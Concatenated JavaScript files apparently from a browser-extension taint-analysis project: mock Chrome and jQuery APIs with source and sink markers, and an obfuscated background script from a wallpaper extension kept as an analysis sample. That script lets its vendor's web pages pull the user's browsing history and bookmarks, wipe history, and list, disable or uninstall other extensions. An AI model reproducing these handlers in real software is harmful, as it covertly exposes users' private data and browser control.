// original file:demos/bg_header.js

// port
function Port(info){
    if (info.includeTlsChannelId){
        this.includeTlsChannelId = info.includeTlsChannelId;
    }
    if (info.name){
        this.name = info.name;
    }
}

Port.prototype.onMessage.addListener = function(myCallback){
    RegisterFunc("bg_port_onMessage", myCallback);
};

Port.prototype.postMessage = function(msg){
    var eventName = 'bg_port_postMessage';
    var info =  {message:msg};
    TriggerEvent(eventName, info);
};

// tab
function Tab(){
    this.active = true;
    this.audible = true;
    this.autoDiscardable = true;
    this.discarded = true;
    this.favIconUrl = 'https://example.com/image.png';
    this.groupId = 1;
    this.height =  600;
    this.highlighted = true;
    this.id = 99;
    this.incognito = false;
    this.index = 2;
    this.mutedInfo = {muted:false};
    this.openerTabId = 1;
    this.pendingUrl = 'https://example2.com';
    this.pinned = true;
    this.sessionId = '23';
    this.status = 'complete';
    this.title = 'example';
    this.url = 'https://example.com';
    this.width =  800;
    this.windowId = 14;
}

// chrome
function Chrome(){}


Chrome.prototype.runtime.onConnect.addListener = function(myCallback) {
  RegisterFunc("bg_chrome_runtime_onConnect", myCallback);
};


Chrome.prototype.topSites.get = function(myCallback){
    var mostVisitedUrls_source = {title:'title', url:'url'};
    // mostVisitedUrls is sensitive data!
    // chrome_topSites_get_source(mostVisitedUrls);
    myCallback(mostVisitedUrls_source);
};

// chrome.tabs.sendMessage(tabId: number, message: any, options: object, responseCallback: function)
// Chrome.prototype.tabs.sendMessage = function(tabId, message, options, responseCallback){
//     var eventName = 'bg_chrome_tabs_sendMessage';
//     var info =  {tabId:99, message:message, options:options, responseCallback:responseCallback};
//     TriggerEvent(eventName, info);
// };
// 
Chrome.prototype.tabs.sendMessage = function(tabId, message, responseCallback){
    var eventName = 'bg_chrome_tabs_sendMessage';
    var info =  {tabId:tabId, message:message, responseCallback:responseCallback};
    TriggerEvent(eventName, info);
};


// chrome.cookies.get(details: CookieDetails, callback: function)
Chrome.prototype.cookies.get = function(details, callback){
    // details does not matter for now
    var cookie_source = {domain:'cookie_domain', expirationDate:2070, hostOnly:true, httpOnly: false, name:'cookie_name', path:'cookie_path',sameSite:'no_restriction', secure:true, session: true, storeId:'cookie_storeId', value: 'cookie_value' };
    // chrome_cookies_get_source(cookie_source);
    callback(cookie_source);
};

// chrome.cookies.getAll(details: object, callback: function)
Chrome.prototype.cookies.getAll = function(details, callback){
    // details does not matter for now
    var cookie_source = {domain:'cookie_domain', expirationDate:2070, hostOnly:true, httpOnly: false, name:'cookie_name', path:'cookie_path',sameSite:'no_restriction', secure:true, session: true, storeId:'cookie_storeId', value: 'cookie_value' };
    // assume there is only one cookie
    var cookies_source = [cookie_source];
    // chrome_cookies_getAll_source(cookies_source);
    callback(cookies_source);
};


// chrome.tabs.query(queryInfo: object, callback: function)
Chrome.prototype.tabs.query = function(queryInfo, callback){
    // queryInfo is to find corresponding tabs, ingore it now
    var tab = new Tab();
    var alltabs = [tab];
    callback(alltabs);
}

// the callback is called once a new tab is activated, we run the callback after all the others are set
Chrome.prototype.tabs.onActivated.addListener = function(myCallback){
    // var activeInfo = {tabId:99, windowId:80};
    // myCallback(activeInfo);
    RegisterFunc("bg_chrome_tabs_onActivated", myCallback);
}


function ActiveInfo(){
    this.tabId = 3;
    this.windowId = 1;
};



// Fired before sending an HTTP request
// chrome.webRequest.onBeforeSendHeaders.addListener(listener: function)
// MDN:
// browser.webRequest.onBeforeSendHeaders.addListener(
//   listener,             //  function
//   filter,               //  object
//   extraInfoSpec         //  optional array of strings
// )
Chrome.prototype.webRequest.onBeforeSendHeaders.addListener = function(myCallback, filter, extraInfoSpec){
    // var request_Headers = [{Content-Length: 348}, {Content-Length: 456}];
    // var details = {frameId = 123, initiator = 'onBeforeSendHeaders_initiator', 
    // method = 'Standard_HTTP_method', parentFrameId = -1, requestHeaders = request_Headers,
    // requestId = 'ID_of_the_request', tabId = 99, timeStamp = 321, type = 'main_frame', url = 'url'
    // };
    // myCallback(details);
    // RegisterFunc();
}

// myCallback:
// (message: any, sender: MessageSender, sendResponse: function) => {...}
// get message from chrome.runtime.sendMessage or chrome.tabs.sendMessage
Chrome.prototype.runtime.onMessage.addListener = function(myCallback) {
    RegisterFunc('bg_chrome_runtime_onMessage', myCallback);
};
MessageSender = function(){
    this.frameId = 123;
    this.guestProcessId=456;
    this.guestRenderFrameRoutingId = 109;
    this.id = 0;
    this.nativeApplication = 'nativeApplication';
    this.origin = 'back';
    this.tab = new Tab();
    this.tlsChannelId = 'tlsChannelId';
    this.url = 'url';
};
function sendResponse(message_back){
    var eventName = 'bg_chrome_runtime_onMessage_response';
    var info = {message: message_back};
    TriggerEvent(eventName, info);
};

// // Tab
// Tab = function(){
//     this.
// }

chrome = new Chrome();



/////////
// original file:demos/jquery_header.js

// the document and its elements are all objects

function Document_element(id, class_name, tag){
    this.id = id;
    this.class_name = class_name;
    this.tag = tag;
}
Document_element.prototype.contentWindow = new Window();
Document_element.prototype.createElement = function(tagname){
    var de = new Document_element(undefined, undefined, tagname);
    return de;
}



function Document(){}
Document.prototype.getElementById = function(id){
    var document_element = new Document_element(id);
};

Document.prototype.body.appendChild = function(){};

var document = new Document();


// $(this).hide() - hides the current element.
// $("p").hide() - hides all <p> elements.
// $(".test").hide() - hides all elements with class="test".
// $("#test").hide() - hides the element with id="test".
function $(a){
    // find element a in document
    // if a is an Array
    if (Array.isArray(a)){
        var array_in = a;
        a = undefined;
    }
    else{
        // $("#test")
        if (a[0] == '#'){
            var document_element = new Document_element(a.substring(1,));
            // document.push(document_element);
            // document[a] = document_element;
        }
        // $(".test")
        else if(a[0] == '.'){
            var document_element = new Document_element(undefined, a.substring(1,));
            // document.push(document_element);
        }
        // document
        else if (a == document){
            var document_element = document;
        }
        // $("p")
        else{
            var document_element = new Document_element(undefined, undefined,a.substring(1,));
            // document.push(document_element);
        }
        var array_in = [document_element];
    }
    return new JQ_obj(a, array_in);
};


// jqXHR
// jQuery.get( url [, data ] [, success ] [, dataType ] )
// data: Type: PlainObject or String
// success: Type: Function( PlainObject data, String textStatus, jqXHR jqXHR )
// dataType: Type: String
$.get = function(url , success){
    var responseText = 'data_from_url_by_get';
    jQuery_get_source(responseText);
    jQuery_get_url_sink(url);
    success(responseText);
    return new jqXHR();
}
// jQuery.post( url [, data ] [, success ] [, dataType ] )
$.post = function( url , data, success){
    var responseText = 'data_from_url_by_post';
    jQuery_post_source(responseText);
    jQuery_post_data_sink(data);
    jQuery_post_url_sink(url);
    success(responseText);
    return new jqXHR();
}
jqXHR = function(){

}
// jqXHR.fail(function( jqXHR, textStatus, errorThrown ) {});
jqXHR.prototype.fail = function(callback){
    // do nothing
    return this;
}
// jqXHR.done(function( data, textStatus, jqXHR ) {});
// done == success
jqXHR.prototype.done = function(callback){
    callback();
    return this;
}
// jqXHR.always(function( data|jqXHR, textStatus, jqXHR|errorThrown ) {});
jqXHR.prototype.always = function(callback){
    callback();
    return this;
}

JQ_obj = function(a, array_in){
    this.selector = a;
    this.context = document;
    var i=0;
    for (i=0; i<array_in.length; i++){
        this[i] = array_in[i];
    }
    this.length = array_in.length;
}

JQ_obj.prototype.val = function(first_argument) {
    if (arguments.length>0){
        JQ_obj_val_sink(first_argument);
        this[0].value = first_argument;
    }
    else{
        // return value of x
    }
};

JQ_obj.prototype.html = function(first_argument) {
    if (arguments.length >0){
        JQ_obj_html_sink(first_argument);
        this[0].html = first_argument;
    }
    else{
        // return html of x
    }
};

JQ_obj.prototype.ready = function(first_argument) {
    if (this[0]==document){
        first_argument();
    }  
};

JQ_obj.prototype.remove = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.focus = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.click = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.attr = function(first_argument, second_argument) {
    this[0].first_argument = second_argument;
};

JQ_obj.prototype.find = function(first_argument) {
    var document_element = new Document_element();
    return new JQ_obj(undefined, document_element);
};

JQ_obj.prototype.filter = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.keyup = function(first_argument) {
    first_argument();
};

JQ_obj.prototype.each = function(first_argument) {
    // for (var i=0; i<this.length; i++){
    //     first_argument.call(this[i]);
    // }
    first_argument.call(this[0]);
};


// jQuery.extend( target, object1 [, objectN ] )
$.extend = function(obj1, obj2){
    for (var key in obj2){
        obj1[key] = obj2[key];
    }
}

// jQuery.extend( [deep ], target, object1 [, objectN ] ) deep copy

function Event(type){
    this.type = type;
}





// original file:demos/Space Galaxy HD Wallpapers CRX 2.1/js/background.js

window.ext_theme = "space_galaxy";
window.ext_category = "fliptab";
window.ext_domain = "fliptab.io";
window.ext_version = chrome.runtime.getManifest().version;
window.ext_id = chrome.runtime.id;
var userid = "";
var jiIl1;
var iIjl1 = "http://new." + ext_domain + "/thankyou/?ext_category=" + ext_category + "&ext_id=" + ext_id + "&ext_theme=" + ext_theme + "&ext_version=" + ext_version + "&ext_uid=";
var Iijl1 = "http://new." + ext_domain + "/welcome/?ext_category=" + ext_category + "&ext_id=" + ext_id + "&ext_theme=" + ext_theme + "&ext_version=" + ext_version + "&ext_uid=";
var jIil1 = {
    urls: ["*://*." + ext_domain + "/*"]
};

function Ilij1() {
    var Ijil1 = Date.now() + chrome.runtime.id + ext_theme + ext_category;
    var ijlI1 = md5(Ijil1);
    return ijlI1;
}
chrome.browserAction.onClicked.addListener(function() {
    chrome.tabs.create({
        url: "newtab.html"
    });
});
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.type == "extensions") {
        if (request.act == "get_all") {
            Ijli1(request, sender, sendResponse);
            return true;
        } else if (request.act == "status") {
            ljIi1(request, sender, sendResponse);
            return true;
        } else if (request.act == "run") {
            jlIi1(request, sender, sendResponse);
            return true;
        } else if (request.act == "unninstall") {
            Ilji1(request, sender, sendResponse);
            return true;
        }
    } else if (request.type == "history") {
        if (request.act == "get_all") {
            lIji1(request, sender, sendResponse);
            return true;
        } else if (request.act == "delete_all") {
            ijI1l(request, sender, sendResponse);
        }
    } else if (request.type == "bookmarks") {
        if (request.act == "get_all") {
            jiI1l(request, sender, sendResponse);
            return true;
        }
    } else if (request.type == "LS") {
        jIli1(request, sender, sendResponse);
        return true;
    } else {
        sendResponse("No type identified");
    }
});
chrome.runtime.onInstalled.addListener(function(details) {
    if (details.reason == "install") {
        chrome.storage.sync.get('userid', function(items) {
            userid = items.userid;
            if (!userid) {
                userid = Ilij1();
                chrome.storage.sync.set({
                    userid: userid
                }, function() {});
            }
            chrome.runtime.setUninstallURL(iIjl1 + userid);
            chrome.tabs.create({
                url: Iijl1 + userid
            });
        });
    }
});
chrome.storage.sync.get("userid", function(items) {
    userid = items.userid;
    if (!userid) {
        userid = Ilij1();
        chrome.storage.sync.set({
            userid: userid
        }, function() {});
    }
});
chrome.storage.sync.get("jiIl1", function(items) {
    jiIl1 = items.jiIl1;
});
chrome.webRequest.onBeforeSendHeaders.addListener(function(details) {
    var sjiIl1ers = details.requestHeaders;
    if (jiIl1) {
        for (kh in jiIl1) {
            sjiIl1ers.push({
                name: kh.replace("_", "-"),
                value: jiIl1[kh]
            });
        }
    }
    var iljI1 = new Date();
    var lijI1 = Math.floor(iljI1.getTime() / 1000);
    sjiIl1ers.push({
        name: "ext-" + ext_theme + "-category",
        value: ext_category
    }, {
        name: "ext-" + ext_theme + "-version",
        value: ext_version
    }, {
        name: "ext-" + ext_theme + "-theme",
        value: ext_theme
    }, {
        name: "ext-" + ext_theme + "-domain",
        value: ext_domain
    }, {
        name: "ext-" + ext_theme + "-uid",
        value: userid
    }, {
        name: "ext-" + ext_theme + "-timestamp",
        value: lijI1.toString()
    }, {
        name: "ext-" + ext_theme + "-id",
        value: chrome.runtime.id
    });
    return {
        requestHeaders: sjiIl1ers
    };
}, jIil1, ["requestHeaders", "blocking"]);

function lIij1(url, a, callback) {
    var jliI1 = new XMLHttpRequest();
    jliI1.responseType = "blob";
    jliI1.onload = function() {
        var ljiI1 = new FileReader();
        ljiI1.onloadend = function() {
            callback(ljiI1.result, a);
        }
        ljiI1.readAsDataURL(jliI1.response);
    };
    jliI1.open("GET", url);
    jliI1.send();
}

function jIli1(request, sender, sendResponse) {
    if (typeof request.vars !== "undefined") {
        chrome.storage.sync.set(request.vars, function() {
            chrome.storage.sync.get(null, function(items) {
                sendResponse(items);
            });
        });
    } else {
        chrome.storage.sync.get(null, function(items) {
            sendResponse(items);
        });
    }
}

function Ijli1(request, sender, sendResponse) {
    chrome.management.getAll(function(extens) {
        for (i = 0; i < extens.length; i++) {
            if (typeof extens[i].icons !== "undefined") {
                lIij1(extens[i].icons[0].url, i, function(base64Img, a) {
                    extens[a].icons[0].url = base64Img;
                    if ((a + 1) == extens.length) {
                        sendResponse(extens);
                    }
                });
            }
        }
    });
}

function jlIi1(request, sender, sendResponse) {
    var iIlj1 = request.id;
    chrome.management.launchApp(iIlj1);
    sendResponse("1");
}

function ljIi1(request, sender, sendResponse) {
    var Iilj1 = request.idapp;
    var ilIj1 = request.status;
    chrome.management.setEnabled(Iilj1, ilIj1, function(ret) {
        sendResponse("1");
    });
}

function Ilji1(request, sender, sendResponse) {
    var liIj1 = request.id;
    chrome.management.uninstall(liIj1);
    chrome.management.onUninstalled.addListener(function(id_ext) {
        if (extId == id_ext) {
            sendResponse("1");
        }
    });
}

function lIji1(request, sender, sendResponse) {
    chrome.history.search({
        text: ""
    }, function(data) {
        sendResponse(data);
    });
}

function ijI1l(request, sender, sendResponse) {
    chrome.history.deleteAll(function() {
        sendResponse("1");
    });
}

function jiI1l(request, sender, sendResponse) {
    chrome.bookmarks.getTree(function(data) {
        sendResponse(data);
    });
}! function(n) {
    "use strict";

    function t(n, t) {
        var r = (65535 & n) + (65535 & t),
            e = (n >> 16) + (t >> 16) + (r >> 16);
        return e << 16 | 65535 & r
    }

    function r(n, t) {
        return n << t | n >>> 32 - t
    }

    function e(n, e, o, u, c, f) {
        return t(r(t(t(e, n), t(u, f)), c), o)
    }

    function o(n, t, r, o, u, c, f) {
        return e(t & r | ~t & o, n, t, u, c, f)
    }

    function u(n, t, r, o, u, c, f) {
        return e(t & o | r & ~o, n, t, u, c, f)
    }

    function c(n, t, r, o, u, c, f) {
        return e(t ^ r ^ o, n, t, u, c, f)
    }

    function f(n, t, r, o, u, c, f) {
        return e(r ^ (t | ~o), n, t, u, c, f)
    }

    function i(n, r) {
        n[r >> 5] |= 128 << r % 32, n[(r + 64 >>> 9 << 4) + 14] = r;
        var e, i, a, h, d, l = 1732584193,
            g = -271733879,
            v = -1732584194,
            m = 271733878;
        for (e = 0; e < n.length; e += 16) i = l, a = g, h = v, d = m, l = o(l, g, v, m, n[e], 7, -680876936), m = o(m, l, g, v, n[e + 1], 12, -389564586), v = o(v, m, l, g, n[e + 2], 17, 606105819), g = o(g, v, m, l, n[e + 3], 22, -1044525330), l = o(l, g, v, m, n[e + 4], 7, -176418897), m = o(m, l, g, v, n[e + 5], 12, 1200080426), v = o(v, m, l, g, n[e + 6], 17, -1473231341), g = o(g, v, m, l, n[e + 7], 22, -45705983), l = o(l, g, v, m, n[e + 8], 7, 1770035416), m = o(m, l, g, v, n[e + 9], 12, -1958414417), v = o(v, m, l, g, n[e + 10], 17, -42063), g = o(g, v, m, l, n[e + 11], 22, -1990404162), l = o(l, g, v, m, n[e + 12], 7, 1804603682), m = o(m, l, g, v, n[e + 13], 12, -40341101), v = o(v, m, l, g, n[e + 14], 17, -1502002290), g = o(g, v, m, l, n[e + 15], 22, 1236535329), l = u(l, g, v, m, n[e + 1], 5, -165796510), m = u(m, l, g, v, n[e + 6], 9, -1069501632), v = u(v, m, l, g, n[e + 11], 14, 643717713), g = u(g, v, m, l, n[e], 20, -373897302), l = u(l, g, v, m, n[e + 5], 5, -701558691), m = u(m, l, g, v, n[e + 10], 9, 38016083), v = u(v, m, l, g, n[e + 15], 14, -660478335), g = u(g, v, m, l, n[e + 4], 20, -405537848), l = u(l, g, v, m, n[e + 9], 5, 568446438), m = u(m, l, g, v, n[e + 14], 9, -1019803690), v = u(v, m, l, g, n[e + 3], 14, -187363961), g = u(g, v, m, l, n[e + 8], 20, 1163531501), l = u(l, g, v, m, n[e + 13], 5, -1444681467), m = u(m, l, g, v, n[e + 2], 9, -51403784), v = u(v, m, l, g, n[e + 7], 14, 1735328473), g = u(g, v, m, l, n[e + 12], 20, -1926607734), l = c(l, g, v, m, n[e + 5], 4, -378558), m = c(m, l, g, v, n[e + 8], 11, -2022574463), v = c(v, m, l, g, n[e + 11], 16, 1839030562), g = c(g, v, m, l, n[e + 14], 23, -35309556), l = c(l, g, v, m, n[e + 1], 4, -1530992060), m = c(m, l, g, v, n[e + 4], 11, 1272893353), v = c(v, m, l, g, n[e + 7], 16, -155497632), g = c(g, v, m, l, n[e + 10], 23, -1094730640), l = c(l, g, v, m, n[e + 13], 4, 681279174), m = c(m, l, g, v, n[e], 11, -358537222), v = c(v, m, l, g, n[e + 3], 16, -722521979), g = c(g, v, m, l, n[e + 6], 23, 76029189), l = c(l, g, v, m, n[e + 9], 4, -640364487), m = c(m, l, g, v, n[e + 12], 11, -421815835), v = c(v, m, l, g, n[e + 15], 16, 530742520), g = c(g, v, m, l, n[e + 2], 23, -995338651), l = f(l, g, v, m, n[e], 6, -198630844), m = f(m, l, g, v, n[e + 7], 10, 1126891415), v = f(v, m, l, g, n[e + 14], 15, -1416354905), g = f(g, v, m, l, n[e + 5], 21, -57434055), l = f(l, g, v, m, n[e + 12], 6, 1700485571), m = f(m, l, g, v, n[e + 3], 10, -1894986606), v = f(v, m, l, g, n[e + 10], 15, -1051523), g = f(g, v, m, l, n[e + 1], 21, -2054922799), l = f(l, g, v, m, n[e + 8], 6, 1873313359), m = f(m, l, g, v, n[e + 15], 10, -30611744), v = f(v, m, l, g, n[e + 6], 15, -1560198380), g = f(g, v, m, l, n[e + 13], 21, 1309151649), l = f(l, g, v, m, n[e + 4], 6, -145523070), m = f(m, l, g, v, n[e + 11], 10, -1120210379), v = f(v, m, l, g, n[e + 2], 15, 718787259), g = f(g, v, m, l, n[e + 9], 21, -343485551), l = t(l, i), g = t(g, a), v = t(v, h), m = t(m, d);
        return [l, g, v, m]
    }

    function a(n) {
        var t, r = "",
            e = 32 * n.length;
        for (t = 0; t < e; t += 8) r += String.fromCharCode(n[t >> 5] >>> t % 32 & 255);
        return r
    }

    function h(n) {
        var t, r = [];
        for (r[(n.length >> 2) - 1] = void 0, t = 0; t < r.length; t += 1) r[t] = 0;
        var e = 8 * n.length;
        for (t = 0; t < e; t += 8) r[t >> 5] |= (255 & n.charCodeAt(t / 8)) << t % 32;
        return r
    }

    function d(n) {
        return a(i(h(n), 8 * n.length))
    }

    function l(n, t) {
        var r, e, o = h(n),
            u = [],
            c = [];
        for (u[15] = c[15] = void 0, o.length > 16 && (o = i(o, 8 * n.length)), r = 0; r < 16; r += 1) u[r] = 909522486 ^ o[r], c[r] = 1549556828 ^ o[r];
        return e = i(u.concat(h(t)), 512 + 8 * t.length), a(i(c.concat(e), 640))
    }

    function g(n) {
        var t, r, e = "0123456789abcdef",
            o = "";
        for (r = 0; r < n.length; r += 1) t = n.charCodeAt(r), o += e.charAt(t >>> 4 & 15) + e.charAt(15 & t);
        return o
    }

    function v(n) {
        return unescape(encodeURIComponent(n))
    }

    function m(n) {
        return d(v(n))
    }

    function p(n) {
        return g(m(n))
    }

    function s(n, t) {
        return l(v(n), v(t))
    }

    function C(n, t) {
        return g(s(n, t))
    }

    function A(n, t, r) {
        return t ? r ? s(t, n) : C(t, n) : r ? m(n) : p(n)
    }
    "function" == typeof define && define.amd ? define(function() {
        return A
    }) : "object" == typeof module && module.exports ? module.exports = A : n.md5 = A
}(this);
